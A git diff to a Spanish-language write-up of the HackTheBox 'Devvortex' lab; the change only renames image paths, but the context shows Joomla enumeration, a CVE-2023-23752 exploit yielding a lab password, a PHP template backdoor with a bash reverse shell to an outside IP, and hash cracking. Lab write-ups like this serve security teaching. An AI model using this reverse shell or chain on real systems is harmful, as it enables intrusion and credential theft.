@@ -30,7 +30,7 @@ description: >-
   platform="HTB"
 %}
 
-![Devvortex](/assets/img/htb-writeups/Pasted image 20231208225239.png)
+![Devvortex](/assets/img/htb-writeups/Pasted-image-20231208225239.png)
 
 ## Enumeración
 
@@ -57,11 +57,11 @@ Agregamos `devvortex.htb` al archivo hosts.
 
 ### Análisis Web
 
-![Web principal](/assets/img/htb-writeups/Pasted image 20231208225239.png)
+![Web principal](/assets/img/htb-writeups/Pasted-image-20231208225239.png)
 
 Examinamos los botones "Contact Us" y el formulario de envío, pero no hacen nada:
 
-![Formulario](/assets/img/htb-writeups/Pasted image 20231209101546.png)
+![Formulario](/assets/img/htb-writeups/Pasted-image-20231209101546.png)
 
 Es una página estática.
 
@@ -71,7 +71,7 @@ Es una página estática.
 $ gobuster dir -u http://devvortex.htb/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 100
 ```
 
-![Gobuster](/assets/img/htb-writeups/Pasted image 20231209102636.png)
+![Gobuster](/assets/img/htb-writeups/Pasted-image-20231209102636.png)
 
 No ha encontrado nada. Vamos a escanear subdominios:
 
@@ -79,15 +79,15 @@ No ha encontrado nada. Vamos a escanear subdominios:
 wfuzz -c -f sub-fighter -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u 'http://devvortex.htb' -H "Host: FUZZ.devvortex.htb" --hc 302
 ```
 
-![Wfuzz](/assets/img/htb-writeups/Pasted image 20231209104703.png)
+![Wfuzz](/assets/img/htb-writeups/Pasted-image-20231209104703.png)
 
 Encontramos el subdominio `dev`. Agregamos `dev.devvortex.htb` al archivo hosts.
 
-![Dev subdomain](/assets/img/htb-writeups/Pasted image 20231209111005.png)
+![Dev subdomain](/assets/img/htb-writeups/Pasted-image-20231209111005.png)
 
 Inspeccionando el código fuente vemos la ruta de una imagen que contiene la palabra `cassiopeia`:
 
-![Cassiopeia](/assets/img/htb-writeups/Pasted image 20231209111537.png)
+![Cassiopeia](/assets/img/htb-writeups/Pasted-image-20231209111537.png)
 
 Buscando por internet descubrimos que es un plugin de Joomla. Confirmamos accediendo al panel de administración:
 
@@ -95,7 +95,7 @@ Buscando por internet descubrimos que es un plugin de Joomla. Confirmamos accedi
 http://dev.devvortex.htb/administrator
 ```
 
-![Joomla admin](/assets/img/htb-writeups/Pasted image 20231209113146.png)
+![Joomla admin](/assets/img/htb-writeups/Pasted-image-20231209113146.png)
 
 Usamos `joomscan` para enumerar:
 
@@ -115,7 +115,7 @@ La versión de Joomla 4.2.6 es vulnerable a CVE-2023-23752 (Information Disclosu
 
 Usamos el PoC de: https://github.com/adhikara13/CVE-2023-23752
 
-![CVE exploit](/assets/img/htb-writeups/Pasted image 20231209120100.png)
+![CVE exploit](/assets/img/htb-writeups/Pasted-image-20231209120100.png)
 
 ```bash
 $ python3 CVE-2023-23752.py -u dev.devvortex.htb -o resultado.txt
@@ -132,9 +132,9 @@ lewis:P4ntherg0t1n5r3c0n##
 
 Accedemos al panel de administración:
 
-![Login](/assets/img/htb-writeups/Pasted image 20231209120413.png)
+![Login](/assets/img/htb-writeups/Pasted-image-20231209120413.png)
 
-![Dashboard](/assets/img/htb-writeups/Pasted image 20231209120548.png)
+![Dashboard](/assets/img/htb-writeups/Pasted-image-20231209120548.png)
 
 ### Reverse Shell via Template
 
@@ -148,7 +148,7 @@ Agregamos en la línea 2:
 system('bash -c "bash -i >& /dev/tcp/10.10.14.68/4444 0>&1"');
 ```
 
-![Template edit](/assets/img/htb-writeups/Pasted image 20231209122543.png)
+![Template edit](/assets/img/htb-writeups/Pasted-image-20231209122543.png)
 
 Nos ponemos en escucha:
 
@@ -162,13 +162,13 @@ Accedemos a la URL del archivo modificado:
 http://dev.devvortex.htb/administrator/templates/atum/login.php
 ```
 
-![Shell](/assets/img/htb-writeups/Pasted image 20231209122947.png)
+![Shell](/assets/img/htb-writeups/Pasted-image-20231209122947.png)
 
 ## Movimiento Lateral
 
 Solo hay un usuario además de root: `logan`
 
-![Users](/assets/img/htb-writeups/Pasted image 20231209124130.png)
+![Users](/assets/img/htb-writeups/Pasted-image-20231209124130.png)
 
 Probamos las credenciales de lewis para conectar a la base de datos:
 
@@ -176,7 +176,7 @@ Probamos las credenciales de lewis para conectar a la base de datos:
 $ mysql -u lewis -p
 ```
 
-![MySQL](/assets/img/htb-writeups/Pasted image 20231209124215.png)
+![MySQL](/assets/img/htb-writeups/Pasted-image-20231209124215.png)
 
 Extraemos los hashes:
 
@@ -196,7 +196,7 @@ Crackeamos el hash de logan:
 $ john --wordlist=/usr/share/wordlists/rockyou.txt hash
 ```
 
-![John](/assets/img/htb-writeups/Pasted image 20231209124721.png)
+![John](/assets/img/htb-writeups/Pasted-image-20231209124721.png)
 
 Credenciales de logan:
 
@@ -214,7 +214,7 @@ logan@devvortex:~$
 
 Hacemos `sudo -l`:
 
-![sudo -l](/assets/img/htb-writeups/Pasted image 20231209125525.png)
+![sudo -l](/assets/img/htb-writeups/Pasted-image-20231209125525.png)
 
 El binario `apport-cli` es vulnerable a CVE-2023-1326 (ejecución de comando en less).
 
